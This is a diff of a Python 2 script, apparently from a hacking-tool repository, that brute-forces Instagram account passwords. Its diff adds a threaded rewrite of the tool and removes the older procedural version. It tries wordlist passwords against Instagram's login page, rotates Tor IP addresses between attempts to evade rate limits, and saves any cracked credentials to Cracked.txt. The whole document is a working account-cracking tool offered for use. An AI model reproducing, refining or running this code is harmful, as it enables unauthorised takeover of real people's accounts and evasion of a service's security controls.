@@ -1,161 +1,216 @@
-#!/usr/bin/env python
+# Date: 08/01/2017
+# Distro: Kali Linux
+# Author: Ethical-H4CK3R
+# Description: Bruteforce Instagram accounts
 #
-# @Author: ETHICAL H4CK3R
-# Distro:  Kali Linux 2.0
 #
-# Brute Force Instagram Accounts
-#
+
 import os
+import re
 import time
-import socks
-import socket
-import random
-import datetime
-import mechanize
-import cookielib
+import argparse
+import threading
 import subprocess
-
-from Core.art import Colors
-from Core.art import Display
+from Queue import Queue
 from platform import platform
+from Core.tor import TorManager
+from Core.browser import Browser
 
-def SetupMechanize():
-  global Br
-  Br=mechanize.Browser()
-  CJ=cookielib.LWPCookieJar()
-  Br.set_cookiejar(CJ)
-  Br.set_handle_equiv(True)
-  Br.set_handle_referer(True)
-  Br.set_handle_robots(False)
-  Br.set_handle_refresh(True)
-  Br.set_handle_redirect(True)
-  Br.addheaders=[('User-agent',random.choice(Agents))]
-  Br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+class Instagram(Browser):
+ def __init__(self,username,wordlist):
+  self.n = '\033[0m'  # null ---> reset
+  self.r = '\033[31m' # red
+  self.g = '\033[32m' # green
+  self.y = '\033[33m' # yellow
 
-def BruteForce(Email,Pass):
+  self.Ips = [] # the last 5 Ip addresses
+  self.keys = [] # the next 5 passwords
+  self.tries = 0
+  self.alive = True
+  self.br = Queue() # the 5 browsers available
+  self.firstIp = True
+  self.tor = TorManager()
+  self.username = username
+  self.wordlist = wordlist
+  self.lock = threading.Lock()
+  super(Instagram,self).__init__()
+
+ def kill(self,msg=None):
   try:
-   Br.select_form(nr=0)
-   Br.form['username']=Email
-   Br.form['password']=Pass
-   try:Br.submit()
-   except:pass
-   if Br.geturl() != Url:
-    AccessGranted(Email,Pass)
-  except KeyboardInterrupt:
-   print'\n';Exit()
+   if msg != 'found':
+    subprocess.call(['clear'])
+    print '{}'.format(msg) if msg else '{0}[{1}-{0}]{2} Exiting {3}...{2}'.\
+    format(self.y,self.r,self.n,self.g)
+   self.alive = False
+   self.tor.stopTor()
+  finally:exit()
 
-def Connect(address, timeout=None, source_address=None):
-  sock=socks.socksocket()
-  sock.connect(address)
-  return sock
+ def setupBrowsers(self):
+  while self.alive:
+   if not self.br.qsize():
+    for _ in range(5):
+     self.br.put(self.createBrowser())
 
-def ObtainProxyIP():
-  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
-  socket.socket=socks.socksocket
-  socket.Connect=Connect
+ def setupPassword(self):
+  with open(self.wordlist,'r') as passwords:
+   for pwd in passwords:
+    pwd = pwd.replace('\n','')
+    if len(self.keys) < 5:
+     self.keys.append(pwd)
+    else:
+     while all([self.alive,len(self.keys)]):pass
+     if not len(self.keys):
+      self.keys.append(pwd)
 
-def UserInput(Logins=[]):
-  subprocess.call(['clear']);print art
-  for i in range(11):print'\n'
-  try:
-   Email=raw_input('{}[{}-{}]{} Enter [ Email || Username ] :{} '.format(Red,Green,Red,White,Green));time.sleep(0.7)
-   Passlist=raw_input('{}[{}-{}]{} Enter Passlist:{} '.format(Red,Green,Red,White,Green));time.sleep(0.7)
-   return Email,Passlist
-  except KeyboardInterrupt:
-   print'\n';Exit()
+   # done reading file
+   while self.alive:
+    if not len(self.keys):
+     self.kill()
 
-def Exit():
-  print exit0 if not found else exit1
-  subprocess.call(['service','tor','stop'])
-  exit()
+ def manageIps(self):
+  if len(self.Ips) == 5:
+   del self.Ips[0]
 
-def InstallTor():
+  # stabilize the list
+  if len(self.Ips) > 5:
+   while all([len(self.Ips) > 4,self.alive]):
+    del self.Ips[0]
+
+ def obtainIp(self):
+  ip = self.getIp()
+  if ip:
+   return ip
+  if self.alive:
+   if not self.connection():
+    if self.alive:
+     self.kill('{0}[{1}-{0}]{2} Lost Internet Connection'.format(self.y,self.r,self.n))
+
+ def startlist(self,rec=5):
+  currentIp = self.obtainIp()
+  if not currentIp:
+   if rec:
+    self.startlist(rec-1)
+   else:
+    if self.alive:
+     self.kill('{0}[{1}-{0}]{2} Unable To Contact Server'.format(self.y,self.r,self.n))
+  else:
+   if not currentIp in self.Ips:
+    self.Ips.append(currentIp)
+    self.firstIp = False
+
+ def modifylist(self,rec=5):
+  self.tor.updateIp()
+  newIp = self.obtainIp()
+
+  if not newIp:
+   if rec:
+    self.modifylist(rec-1)
+   else:
+    if self.alive:
+     self.kill('{0}[{1}-{0}]{2} Unable To Contact Server'.format(self.y,self.r,self.n))
+  else:
+   if not newIp in self.Ips:
+    self.Ips.append(newIp)
+   else:
+    self.modifylist()
+
+ def changeIp(self,br):
+   self.manageIps()
+   if self.firstIp:
+    self.startlist()
+   else:
+    self.modifylist()
+
+ def attempt(self,br,user,pwd):
+  with self.lock:
+   if self.alive:
+    subprocess.call(['clear'])
+    self.display(pwd)
+
+    # try password
+    html = self.login(br,pwd)
+    if html:
+     if self.browser.geturl() != self.url:
+      subprocess.call(['clear'])
+      print '{0}[{1}-{0}]{2} Username: {4}{3}{2}'.format(self.y,self.r,self.n,self.username,self.g)
+      print '{0}[{1}-{0}]{2} Password: {4}{3}{2}'.format(self.y,self.r,self.n,pwd,self.g)
+      print '{0}[{1}-{0}]{2} Attempts: {0}{3}{2}'.format(self.y,self.r,self.n,self.tries+1)
+      with open('Cracked.txt','a') as f:f.write('Username: {}\nPassword: {}\n\n'.\
+      format(self.username,pwd))
+      self.kill('found'.format(self.username,pwd))
+     del self.keys[self.keys.index(pwd)]
+     self.tries+=1
+    else:
+     if self.alive:
+      self.changeIp(br)
+
+ def display(self,pwd):
   subprocess.call(['clear'])
-  time.sleep(0.7)
-  print '[!] Installing Tor ...';time.sleep(0.7);
-  subprocess.call(['apt-get','update'])
-  subprocess.call(['apt-get','install','tor','-y'])
-  subprocess.call(['apt-get','install','--fix-missing'])
+  print '''{0}[{1}-{0}]{2} Username: {1}{3}{2}
+        \r{0}[{1}-{0}]{2} Password: {1}{4}{2}
+        \r{0}[{1}-{0}]{2} Attempts: {0}{5}{2}
+        '''.format(self.y,self.r,self.n,self.username,pwd,self.tries+1)
 
-def Refresh():
-  try:
-   RestartTor()
-   ObtainProxyIP()
-   SetupMechanize()
-   time.sleep(3)
-  except KeyboardInterrupt:
-   print'\n';Exit()
+ def run(self):
+  threading.Thread(target=self.setupBrowsers).start()
+  threading.Thread(target=self.setupPassword).start()
 
-def RestartTor():
-  subprocess.call(['service','tor','restart'])
-  time.sleep(1)
+  while self.alive:
+   while all([self.alive,len(self.keys),self.br.qsize()]):
+    bot = None # workers
+    brOpen = 0 # browsers open
+    tmpLst = [pwd for pwd in self.keys]
 
-def Message(Email):
-  subprocess.call(['clear'])
-  print art
-  for i in range(10):print'\n'
-  print '{}[{}!{}]{} Brute Force In Progress ...{}'.format(Red,Yellow,Red,Yellow,White)
-  print '{}[{}-{}]{} Email: {}{}{}'.format(Red,Yellow,Red,White,Yellow,Email,White)
-  print '{}[{}-{}]{} Pass:  {}{}{}'.format(Red,Yellow,Red,White,Yellow,passwrd,White)
-  print '{}[{}-{}]{} Attempts: {}{}{}'.format(Red,Yellow,Red,White,Yellow,attempt,White)
+    while all([len(tmpLst),self.br.qsize(),self.alive,brOpen < 5]):
+     browser = self.br.get()
+     password = tmpLst[0]
+     del tmpLst[0]
 
-def CurrentTime():
-  now  = datetime.datetime.now()
-  time = now.strftime("%Y-%m-%d %H:%M")
-  date = time[:10]
-  mins = time[-3:]
-  hrs  = int(time[-5:-3])
-  zone = 'am'
-  if hrs > 12:
-   hrs  = hrs-12
-   zone = 'pm'
-  return '{} {}{} {}'.format(date,hrs,mins,zone)
+     if self.alive:
+      bot = threading.Thread(target=self.attempt,args=[browser,self.username,password])
+      bot.start()
+      brOpen+=1
 
-def AccessGranted(email,password):
-  global found;found=True
-  with open('Cracked.txt','a') as File:
-   File.write('Username: {}\nPassword: {}\nTime Started: {}\nTime Accessed: {}\n\n'.format(email,password,TimeStarted,CurrentTime()))
-  Exit()
+    # wait for bot
+    if bot:
+     while all([self.alive,bot.is_alive()]):pass
+     if self.alive:
+      self.changeIp(browser)
+      browser.close()
+
+def main():
+ # assign arugments
+ args = argparse.ArgumentParser()
+ args.add_argument('username',help='Email or username')
+ args.add_argument('wordlist',help='wordlist')
+ args = args.parse_args()
+
+ # assign variables
+ username = args.username
+ wordlist = args.wordlist
+ engine = Instagram(username,wordlist)
+
+ # does tor exists?
+ if not os.path.exists('/usr/sbin/tor'):
+  try:engine.tor.installTor()
+  except KeyboardInterrupt:engine.kill()
+  if not os.path.exists('/usr/sbin/tor'):
+   engine.kill('{0}[{1}-{0}]{2} Please Install Tor'.\
+   format(engine.y,engine.r,engine.n))
+
+ # start attack
+ try:
+  engine.tor.updateIp()
+  engine.run()
+ finally:
+  if engine.alive:
+   engine.kill()
 
 if __name__ == '__main__':
-  if os.getuid():
-   exit('{}[{}!{}]{} Root Access Required'.format(Red,Yellow,Red,Blue))
+ if not 'kali' in platform():
+  exit('Kali Linux required')
 
-  if not 'kali' in platform():
-   exit('Kali Linux 2.0 required')
-
-  Red,Blue,Green,Yellow,White=Colors[0],Colors[1],Colors[2],Colors[3],Colors[4]
-
-  art=Display()
-  Attempt,attempt,found=1,1,False
-  Url='https://www.instagram.com/accounts/login/?force_classic_login'
-
-  Agents=[( 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
-	      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36',
-	      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36',
-	      'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36' )]
-
-  if not os.path.exists('/usr/bin/tor'):InstallTor()
-  from Core.Conf import ReWrite
-
-  exit0 = '{}[{}-{}]{} Password Found: {}False'.format(Red,Yellow,Red,White,Red)
-  exit1 = '{}[{}-{}]{} Password Found: {}True'.format(Red,Yellow,Red,White,Green)
-  Input = UserInput()
-  Email = Input[0]
-  Pass  = Input[1]
-
-  ReWrite();Refresh();Br.open(Url)
-  TimeStarted=CurrentTime()
-  with open(Pass,'r') as File:
-   for passwrd in File:
-    if not len(passwrd):continue
-    try:
-     passwrd = passwrd.replace('\n','')
-     Message(Email)
-     BruteForce(Email,passwrd)
-     if Attempt==3:Refresh();Br.open(Url);Attempt=0
-     Attempt+=1
-     attempt+=1
-    except KeyboardInterrupt:
-     print'\n';Exit()
-  Exit()
+ if os.getuid():
+  exit('root access required')
+ else:
+  main()
